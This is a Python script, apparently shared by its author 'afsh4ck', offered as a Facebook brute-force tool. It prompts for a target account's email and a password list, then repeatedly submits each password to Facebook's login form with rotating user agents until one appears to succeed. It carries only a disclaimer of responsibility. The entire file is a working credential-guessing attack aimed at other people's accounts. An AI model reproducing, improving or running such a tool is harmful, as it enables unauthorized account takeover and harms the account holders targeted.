#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import os
import sys
import mechanize
import http.cookiejar
import random
import time

os.system('clear')

def runntek(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(10. / 100)

# Variables de color
GL = "\033[96;1m"  # Blue aqua
BB = "\033[34;1m"  # Blue light
YY = "\033[33;1m"  # Yellow light
GG = "\033[32;1m"  # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m"  # Blue
CC = "\033[36;1m"  # Cyan light
B = "\033[34m"  # Blue
Y = "\033[33;1m"  # Yellow
G = "\033[32m"  # Green
W = "\033[0;1m"  # White
R = "\033[31m"  # Blue
C = "\033[36;1m"  # Cyan
rand = (BB, YY, GG, WW, RR, CC)
P = random.choice(rand)

def cover():
    print(Y + """

███████╗██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██╔════╝██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
█████╗  ██████╔╝██████╔╝██║   ██║   ██║   █████╗  
██╔══╝  ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
██║     ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
╚═╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝                                   
	""")
    runntek(WW + "No me responsabilizo del mal uso de esta herramienta")
    time.sleep(1)
    print(" ")
    print(GL + "+====================================================+")
    print(RR + "|           FACEBOOK BRUTEFORCE By afsh4ck           |")
    print(GL + "+====================================================+")
    print(WW + "|               Developed by: afsh4ck                |")
    print(WW + "|                  GitHub: afsh4ck                   |")
    print(WW + "|                  TikTok: afsh4ck                   |")
    print(Y + "|                  Version: 1.0                      |")
    print(GL + "+====================================================+")
    print(RR + "|           FACEBOOK BRUTEFORCE By afsh4ck           |")
    print(GL + "+====================================================+")
    print("\n")

cover()

email = str(input(WW + "Introduzca el email del objetivo\033[33;1m: "))

passwordlist = str(input(WW + "Ingrese el archivo de Contraseñas\033[95m [ pass.txt ] \033[92;1m: "))

# login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'
login = 'https://www.facebook.com/login.php?login_attempt=1'

useragents = ['Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
              'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck']

def runntek(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(10. / 100)

def main():
    while True:
        try:
            global br
            br = mechanize.Browser()
            cj = http.cookiejar.LWPCookieJar()
            br.set_handle_robots(False)
            br.set_handle_redirect(True)
            br.set_cookiejar(cj)
            br.set_handle_equiv(True)
            br.set_handle_referer(True)
            br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
            welcome()
            search()
            print(" ")
            print(RR + "Desarrolla tus propios diccionarios")
            print(RR + "Será más eficaz a la hora del ataque")
            time.sleep(1)
            print(WW + 34 * "  -")
        except KeyboardInterrupt:
            print("\n" + RR + "[*] ¿Deseas salir? (s/n):")
            choice = input()
            if choice.lower() == 's':
                print(G + "[+] Happy Hacking :)")
                sys.exit(0)
            elif choice.lower() == 'n':
                continue
            else:
                print(RR + "Opción inválida. Continuando...")
                continue

def kol():
    nok = input("[*] Editar lista de palabras? \033[96;1m[s/n]: ")
    if nok == "s":
        print("[+] Por favor escriba la orden\033[92;1m[ nano pass.txt ] !")
        print(WW + (41 * "-"))
        print(GL + (" "))
        os.sys.exit()
    else:
        print(G + "[+] Happy Hacking :)")
        exit(0)

def brute(password):
    sys.stdout.write(GG + "\r[+]\033[97;1m Probando... {}".format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form['email'] = email
    br.form['pass'] = password
    sub = br.submit()
    # En lugar de obtener la URL, verifica si hay una redirección a la página de inicio de sesión
    if 'login_attempt' not in sub.geturl():
        print("\033[92;1m\n\n[+]\033[97;1m Password Encontrada \033[31;1m===| \033[96;1m{}".format(password))
        print(" ")
        input(WW + "PULSE ENTER PARA SALIR...")
        print(G + "[+] Happy Hacking :)")
        sys.exit(1)

def search():
    global password
    passwords = open(passwordlist, "r")
    for password in passwords:
        passwords = password.replace("\n", "")
        brute(password)

# welcome
def welcome():
    print(" ")
    total = open(passwordlist, "r")
    total = total.readlines()
    print(" ")
    print(GL + "[*] Cuenta a Crackear : {}".format(email))
    print(RR + "[*] Cantidad :", len(total), WW + "passwords")
    print(Y + "[*] Crackeando, por favor, espera...\n")

if __name__ == '__main__':
    main()
